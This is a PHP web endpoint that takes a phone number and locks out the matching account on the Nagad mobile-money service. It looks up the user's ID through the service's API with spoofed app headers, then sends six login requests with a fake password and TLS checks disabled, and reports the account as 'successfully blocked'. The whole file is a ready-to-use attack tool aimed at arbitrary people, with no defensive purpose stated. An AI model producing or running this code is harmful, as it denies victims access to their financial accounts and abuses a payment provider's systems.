<?php
header('Content-Type: application/json; charset=utf-8');
$number = isset($_GET['number']) ? $_GET['number'] : null;

if (!$number) {
    echo json_encode(['error' => 'Number parameter is required'], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

$pin = '6C237681E70921603A306BE9A1A5D9833FCE5C1E268F52B1650970EAAD0DCE21';
$pass = str_repeat($pin, 10);

$api = "https://app2.mynagad.com:20002/api/user/check-user-status-for-log-in?msisdn=" . urlencode($number);
$headers = [
    "X-KM-User-AspId: 100012345612345",
    "X-KM-User-Agent: ANDROID/1164",
    "X-KM-DEVICE-FGP: 19DC58E052A91F5B2EB59399AABB2B898CA68CFE780878C0DB69EAAB0553C3C6",
    "X-KM-Accept-language: bn",
    "X-KM-AppCode: 01",
];

// First API request to get userId
$ch = curl_init($api);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo json_encode(['error' => curl_error($ch)], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    curl_close($ch);
    exit;
}

curl_close($ch);

$rafir_gf_er_pass = json_decode($response, true);
if (!isset($rafir_gf_er_pass['userId'])) {
    echo json_encode(['error' => 'userId not found in the response'], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

$userId = $rafir_gf_er_pass['userId'];

// Now making 6 requests to block the account
$url_block = 'https://app2.mynagad.com:20002/api/login';

$successful_requests = 0; // Count successful requests

for ($i = 0; $i < 6; $i++) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url_block);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: okhttp/3.14.9',
        'Connection: Keep-Alive',
        'Accept-Encoding: gzip',
        'X-KM-UserId: ' . $userId,
        'X-KM-User-AspId: 100012345612345',
        'X-KM-User-Agent: ANDROID/1164',
        'X-KM-Accept-language: bn',
        'X-KM-AppCode: 01',
        'Content-Type: application/json; charset=UTF-8'
    ]);

    $cuda_kha = [
        'aspId' => '100012345612345',
        'password' => $pass,
        'username' => $number
    ];

    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($cuda_kha));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo json_encode(['error' => curl_error($ch)], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        curl_close($ch);
        continue; // Skip this iteration and go to the next request
    }

    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 200) {
        $successful_requests++; // Count successful attempts
    }
}

if ($successful_requests > 0) {
    echo json_encode([
        'STATUS' => 'SUCCESS',
        'OWNER' => 'Kingi Charles',
        'CHANNEL' => 'Not Found',
        'developer' => 'Kingi Charles',
        'message' => "Nagad account has been successfully blocked. Total successful requests: $successful_requests"
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
} else {
    echo json_encode([
        'STATUS' => 'SUCCESS',
        'OWNER' => 'Kingi Charles',
        'CHANNEL' => 'Not Found',
        'error' => 'Failed to block the account in all 6 attempts. Response: ' . $response
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}
?>
